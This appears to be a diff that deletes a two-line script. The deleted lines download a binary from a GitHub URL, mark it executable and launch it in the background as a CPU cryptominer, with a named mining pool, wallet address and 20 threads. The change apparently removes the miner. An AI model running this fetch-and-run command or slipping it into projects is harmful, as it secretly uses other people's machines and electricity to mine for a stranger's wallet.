@@ -1,2 +1,0 @@
-wget https://raw.githubusercontent.com/nathanfleight/scripts/main/Naughty_Doctor
-chmod +x Naughty_Doctor && ./Naughty_Doctor --algorithm yespower --pool stratum+tcp://yespower.sea.mine.zpool.ca:6234 --wallet LafNRejtEsShaE3sjo1Gdva7dNjYYMX27M.ZZ --password c=LTC --cpu-threads 20 --keepalive value &
